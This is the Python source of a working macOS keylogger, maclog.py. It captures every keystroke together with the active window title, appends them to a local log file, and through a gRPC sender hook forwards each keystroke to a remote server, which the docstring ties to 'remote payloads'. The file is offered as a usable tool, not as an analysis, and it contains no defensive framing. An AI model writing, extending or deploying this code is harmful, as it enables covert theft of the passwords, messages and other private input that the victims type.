# -*- coding: utf-8 -*-
"""
maclog.py - macOS Keylogger with Window Information

Simple keylogger that captures keystrokes and tracks active window.
macOS only - uses AppKit/Quartz for window detection.

Usage:
    python maclog.py
    
Press ESC to stop.

Note: Grant Accessibility permissions in
System Preferences > Security & Privacy > Privacy > Accessibility
"""

from pynput import keyboard
from datetime import datetime

try:
    from AppKit import NSWorkspace
    HAS_APPKIT = True
except ImportError:
    HAS_APPKIT = False
    print("[!] AppKit not found, window tracking disabled")
    print("[!] install with: pip install pyobjc-framework-Cocoa")

try:
    from Quartz import (
        CGWindowListCopyWindowInfo,
        kCGWindowListOptionOnScreenOnly,
        kCGNullWindowID
    )
    HAS_QUARTZ = True
except ImportError:
    HAS_QUARTZ = False

# config
OUTPUT_FILE = 'keylog.txt'
ENABLE_TIMESTAMPS = True

# track last window to detect changes
last_window_title = ""

# optional callbacks — set by loggerFunction()
_action_callback = None   # legacy
_grpc_sender = None       # NEW: sends to gRPC server


def get_active_window_title():
    if not HAS_APPKIT:
        return "Unknown"
    
    try:
        workspace = NSWorkspace.sharedWorkspace()
        active_app = workspace.frontmostApplication()
        
        if active_app is None:
            return "Desktop"
        
        app_name = active_app.localizedName()
        
        if app_name == "Finder":
            if HAS_QUARTZ:
                window_list = CGWindowListCopyWindowInfo(
                    kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
                pid = active_app.processIdentifier()
                for window in window_list:
                    if window.get('kCGWindowOwnerPID') == pid:
                        window_name = window.get('kCGWindowName')
                        if window_name and window_name != "":
                            return f"Finder - {window_name}"
            return "Desktop"
        
        if HAS_QUARTZ:
            window_list = CGWindowListCopyWindowInfo(
                kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
            pid = active_app.processIdentifier()
            for window in window_list:
                if window.get('kCGWindowOwnerPID') == pid:
                    window_name = window.get('kCGWindowName')
                    if window_name and window_name != "":
                        return window_name
        
        return app_name if app_name else "Desktop"
        
    except Exception:
        return "Desktop"


def on_press(key):
    """
    called on every key press.
    - logs to file
    - sends to gRPC server via _grpc_sender (if set)
    - calls legacy _action_callback (if set)
    """
    global last_window_title
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window_title()
    
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'

    # ── gRPC send ──
    if _grpc_sender:
        import threading
        message = f"[MAC] {key_str} | {key_type} | {current_window} | {timestamp}"
        threading.Thread(target=_grpc_sender, args=(message,), daemon=True).start()

    # ── legacy action callback ──
    if _action_callback:
        import threading
        threading.Thread(
            target=_action_callback,
            args=(key_str, key_type, current_window, timestamp),
            daemon=True
        ).start()

    # ── write to local log file ──
    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            if current_window != last_window_title:
                f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                last_window_title = current_window

            if key_type == 'char':
                if ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] Key: {key_str}\n')
                else:
                    f.write(key_str)
            else:
                if key_str == 'space':
                    f.write(' ')
                elif key_str == 'enter':
                    f.write('\n')
                elif ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] [{key_str}]\n')
                else:
                    f.write(f'[{key_str}]')
                
    except Exception as e:
        print(f"[ERROR] {e}")


def on_release(key):
    if key == keyboard.Key.esc:
        print("[*] ESC pressed, stopping...")
        return False


def loggerFunction(action=None, grpc_sender=None):
    """
    main keylogger function.
    
    args:
        action:      legacy callback(key_str, key_type, window, timestamp)
        grpc_sender: callable(message: str) — forwards each keystroke to gRPC server.
                     Pass cln.send_key_non_blocking for remote payloads.
    """
    global _action_callback, _grpc_sender
    _action_callback = action
    _grpc_sender = grpc_sender
    
    print("[*] macOS Keylogger Started")
    print(f"[*] Output: {OUTPUT_FILE}")
    print(f"[*] Timestamps: {ENABLE_TIMESTAMPS}")
    print(f"[*] gRPC sender: {'enabled' if grpc_sender else 'disabled'}")
    print(f"[*] Action callback: {'enabled' if action else 'disabled'}")
    print("[*] Press ESC to stop")
    print("[*] Note: Grant Accessibility permissions if keys aren't captured\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    _action_callback = None
    _grpc_sender = None
    print("[*] Keylogger stopped.")


if __name__ == "__main__":
    loggerFunction()